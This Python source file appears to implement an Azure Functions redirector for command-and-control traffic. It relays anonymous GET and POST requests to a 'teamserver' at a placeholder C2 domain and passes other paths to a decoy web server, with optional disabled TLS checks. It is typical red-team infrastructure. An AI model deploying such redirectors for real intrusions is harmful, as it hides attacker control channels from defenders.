import os
import ssl
import urllib.parse
import urllib.request
from urllib.error import HTTPError, URLError
import re
import logging
try:
    import azure.functions as func
except ImportError:  # pragma: no cover - allow local linting without Azure Functions runtime
    class _Func:  # minimal stubs for linters/type checkers
        class HttpRequest: ...
        class HttpResponse:
            def __init__(self, *args, **kwargs): ...
        class AuthLevel:
            ANONYMOUS = 0
        class FunctionApp:
            def route(self, *args, **kwargs):
                def _decorator(f):
                    return f
                return _decorator
    func = _Func()  # type: ignore

app = func.FunctionApp()

TEAMSERVER_GET_URL = os.environ.get(
    "TEAMSERVER_GET_URL", "https://your-c2-domain.com/api/get"
)
TEAMSERVER_POST_URL = os.environ.get(
    "TEAMSERVER_POST_URL", "https://your-c2-domain.com/api/post"
)
WEB_SERVER_URL = os.environ.get("WEB_SERVER_URL", "http://example.com")
ALLOW_INSECURE_SSL = os.environ.get("ALLOW_INSECURE_SSL", "false").lower() in ("1", "true", "yes")
TEAMSERVER_GET_ROUTE = os.environ.get("TEAMSERVER_GET_ROUTE", "get")
TEAMSERVER_POST_ROUTE = os.environ.get("TEAMSERVER_POST_ROUTE", "post")
WEB_ROUTE_BASE = os.environ.get("WEB_ROUTE_BASE", "web")

HOP_BY_HOP_HEADERS = {
    "connection",
    "keep-alive",
    "proxy-authenticate",
    "proxy-authorization",
    "te",
    "trailer",
    "transfer-encoding",
    "upgrade",
}


def sanitize_ip(ip: str):
    """
    Sanitize the IP address by stripping any port information and validating it.
    """
    ip_regex = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$|^[a-fA-F0-9:]+$"

    if ':' in ip:
        ip = ip.split(':')[0]

    if re.match(ip_regex, ip):
        return ip
    return None

def get_real_client_ip(req: func.HttpRequest):
    """
    Extract the real client IP from the X-Forwarded-For header.
    """
    client_ip = (
        req.headers.get("X-Forwarded-For")
        or req.headers.get("X-Client-IP")
        or req.headers.get("X-Real-IP")
    )
    if client_ip:
        ip = client_ip.split(',')[0].strip()
        return sanitize_ip(ip)
    else:
        return sanitize_ip(req.headers.get('REMOTE_ADDR', ''))


def sanitize_request_headers(headers: dict, drop_host: bool = True) -> dict:
    """
    Remove hop-by-hop and potentially conflicting headers.
    Optionally drop Host header so the upstream can set it.
    """
    sanitized = {}
    for k, v in headers.items():
        lk = k.lower()
        if lk in HOP_BY_HOP_HEADERS:
            continue
        if drop_host and lk == "host":
            continue
        if lk == "content-length":
            # Let urllib recompute Content-Length
            continue
        sanitized[k] = v
    return sanitized


def sanitize_response_headers(headers: dict) -> dict:
    return {k: v for k, v in headers.items() if k.lower() not in HOP_BY_HOP_HEADERS}


def build_ssl_context() -> ssl.SSLContext | None:
    if ALLOW_INSECURE_SSL:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx
    return None

@app.route(route=TEAMSERVER_GET_ROUTE, auth_level=func.AuthLevel.ANONYMOUS)
def get_teamserver(req: func.HttpRequest) -> func.HttpResponse:
    """
    GET request proxy to an external teamserver URL.
    """
    client_ip = get_real_client_ip(req)

    headers = sanitize_request_headers(dict(req.headers))
    if client_ip:
        headers['X-Forwarded-For'] = client_ip

    request = urllib.request.Request(TEAMSERVER_GET_URL, headers=headers, method="GET")

    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            response_body = response.read()
            response_headers = dict(response.getheaders())
            status_code = response.getcode()
        return func.HttpResponse(body=response_body, status_code=status_code, headers=sanitize_response_headers(response_headers))
    except HTTPError as e:
        logging.warning("Upstream GET error: %s", e)
        return func.HttpResponse(body=e.read(), status_code=e.code, headers=sanitize_response_headers(dict(e.headers)))
    except URLError as e:
        logging.error("Upstream GET unreachable: %s", e)
        return func.HttpResponse("Bad Gateway", status_code=502)
    except Exception as e:  # noqa: BLE001  pylint: disable=broad-except
        logging.exception("Unexpected error on GET proxy")
        return func.HttpResponse("Internal Server Error", status_code=500)


@app.route(route=TEAMSERVER_POST_ROUTE, auth_level=func.AuthLevel.ANONYMOUS)
def post_teamserver(req: func.HttpRequest) -> func.HttpResponse:
    """
    POST request proxy to an external teamserver URL.
    """
    client_ip = get_real_client_ip(req)

    headers = sanitize_request_headers(dict(req.headers))
    if client_ip:
        headers['X-Forwarded-For'] = client_ip

    data = req.get_body()

    request = urllib.request.Request(
        TEAMSERVER_POST_URL, data=data, headers=headers, method="POST"
    )

    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            response_body = response.read()
            response_headers = dict(response.getheaders())
            status_code = response.getcode()
        return func.HttpResponse(body=response_body, status_code=status_code, headers=sanitize_response_headers(response_headers))
    except HTTPError as e:
        logging.warning("Upstream POST error: %s", e)
        return func.HttpResponse(body=e.read(), status_code=e.code, headers=sanitize_response_headers(dict(e.headers)))
    except URLError as e:
        logging.error("Upstream POST unreachable: %s", e)
        return func.HttpResponse("Bad Gateway", status_code=502)
    except Exception as e:  # noqa: BLE001  pylint: disable=broad-except
        logging.exception("Unexpected error on POST proxy")
        return func.HttpResponse("Internal Server Error", status_code=500)


def _forward_web(req: func.HttpRequest, extra_path: str = "") -> func.HttpResponse:
    """
    Forwards requests (including headers, body, and query parameters) to a remote web server,
    returning the response, status code, and filtered headers to the caller.
    """
    client_ip = get_real_client_ip(req)

    headers = sanitize_request_headers(dict(req.headers), drop_host=True)
    if client_ip:
        headers["X-Forwarded-For"] = client_ip

    context = build_ssl_context()
    body = req.get_body()

    base = WEB_SERVER_URL.rstrip('/')
    if extra_path:
        base = f"{base}/{extra_path.lstrip('/')}"

    target_url = base
    url_params = urllib.parse.urlencode(req.params)
    if url_params:
        target_url += "?" + url_params

    request = urllib.request.Request(
        url=target_url,
        data=body if req.method.upper() != "GET" else None,
        headers=headers,
        method=req.method,
    )

    try:
        if context is not None:
            resp_ctx = {"context": context}
        else:
            resp_ctx = {}
        with urllib.request.urlopen(request, timeout=20, **resp_ctx) as response:
            response_body = response.read()
            response_headers = dict(response.getheaders())
            status_code = response.getcode()
        filtered_headers = sanitize_response_headers(response_headers)
        return func.HttpResponse(body=response_body, status_code=status_code, headers=filtered_headers)
    except HTTPError as e:
        logging.warning("Upstream WEB error: %s", e)
        return func.HttpResponse(body=e.read(), status_code=e.code, headers=sanitize_response_headers(dict(e.headers)))
    except URLError as e:
        logging.error("Upstream WEB unreachable: %s", e)
        return func.HttpResponse("Bad Gateway", status_code=502)
    except Exception:  # noqa: BLE001  pylint: disable=broad-except
        logging.exception("Unexpected error on WEB proxy")
        return func.HttpResponse("Internal Server Error", status_code=500)


@app.route(route=f"{WEB_ROUTE_BASE}", auth_level=func.AuthLevel.ANONYMOUS)
def web_server(req: func.HttpRequest) -> func.HttpResponse:
    return _forward_web(req)


@app.route(route=f"{WEB_ROUTE_BASE}/{{*path}}", auth_level=func.AuthLevel.ANONYMOUS)
def web_server_wildcard(req: func.HttpRequest) -> func.HttpResponse:
    extra_path = req.route_params.get("path", "") if hasattr(req, "route_params") else ""
    return _forward_web(req, extra_path)
